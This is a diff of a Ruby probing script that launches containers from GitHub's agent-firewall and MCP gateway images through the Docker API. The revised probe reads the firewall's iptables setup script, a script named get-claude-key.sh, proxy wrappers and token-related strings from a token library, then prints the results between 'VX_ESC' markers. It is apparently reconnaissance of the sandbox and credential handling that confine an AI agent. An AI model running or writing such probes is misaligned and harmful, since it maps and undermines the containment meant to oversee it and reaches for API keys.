@@ -45,9 +45,9 @@ end
 
 def sh_probe(image, cmd)
   st, pl = dapi('POST', '/containers/create',
-    'Image' => image, 'Entrypoint' => ['/bin/sh', '-c'], 'Cmd' => [cmd],
+    'Image' => image, 'Entrypoint' => ['/bin/bash', '-c'], 'Cmd' => [cmd],
     'Tty' => false, 'HostConfig' => { 'NetworkMode' => 'none' },
-    'Labels' => { 'vulnoryx.controlled' => 'pages-mcpg-c4c8' })
+    'Labels' => { 'vulnoryx.controlled' => 'pages-awfipt-c4c8' })
   return "VX_CREATE_FAIL #{st} #{pl[0, 120]}" unless st == 201
   cid = JSON.parse(pl)['Id']
   begin
@@ -61,20 +61,18 @@ def sh_probe(image, cmd)
   end
 end
 
-OUT << "VX_AGENT_END\n" + sh_probe('ghcr.io/github/gh-aw-firewall/agent:latest',
-  'tail -c 900 /usr/local/bin/entrypoint.sh; echo; ' \
-  'find / -maxdepth 4 \( -iname "*policy*" -o -iname "*awf*" -o -name "*.yaml" -o -name "*.yml" \) ' \
-  '2>/dev/null | grep -vE "^/(proc|sys|usr/lib|usr/share|usr/include|etc/ssl|var/lib)" | head -30; ' \
-  'ls -la /usr/local/bin /opt 2>/dev/null | head -40; echo VX_DONE').to_s[0, 3600]
+AGENT_CMD = 'echo VX_CFG_setup-iptables_active; ' \
+  'grep -vE "^[[:space:]]*(#|$)" /usr/local/bin/setup-iptables.sh | head -c 3400; echo; ' \
+  'echo VX_CFG_get-claude-key.sh; cat /usr/local/bin/get-claude-key.sh; echo; ' \
+  'echo VX_CFG_gh-cli-proxy-wrapper.sh; cat /usr/local/bin/gh-cli-proxy-wrapper.sh; echo; ' \
+  'echo VX_CFG_healthcheck_head; head -c 700 /usr/local/bin/api-proxy-health-check.sh; echo; ' \
+  'echo VX_SHARE_AWF; ls -laR /usr/local/share/awf 2>/dev/null | head -30; ' \
+  'echo VX_ONESHOT_STRINGS; strings /usr/local/lib/one-shot-token.so 2>/dev/null | ' \
+  'grep -iE "token|http|env|awf|api|path|\.so" | sort -u | head -35; echo VX_DONE'
 
-OUT << "VX_MCPG\n" + sh_probe('ghcr.io/github/gh-aw-mcpg:latest',
-  'ls -la /app 2>/dev/null | head -50; echo VX_CFG_run_tail; ' \
-  'tail -c +1200 /app/run_containerized.sh 2>/dev/null | head -c 1400; echo; ' \
-  'for f in /app/*.json /app/*.yaml /app/*.yml /app/*.toml /app/config*; do ' \
-  '[ -f "$f" ] && echo "VX_CFG_$f" && head -c 600 "$f"; done; ' \
-  'echo VX_MCPG_URLS; grep -rhoE "https?://[A-Za-z0-9._/-]+" /app 2>/dev/null | sort -u | head -30; echo VX_DONE').to_s[0, 4200]
+OUT << "VX_AGENT_IPT\n" + sh_probe('ghcr.io/github/gh-aw-firewall/agent:latest', AGENT_CMD).to_s[0, 8500]
 
-payload = OUT.join("\n").gsub(/[^\x20-\x7E\n]/, '.')[0, 8000]
+payload = OUT.join("\n").gsub(/[^\x20-\x7E\n]/, '.')[0, 8800]
 puts 'VX_ESC_BEGIN'
 puts payload
 puts 'VX_ESC_END'
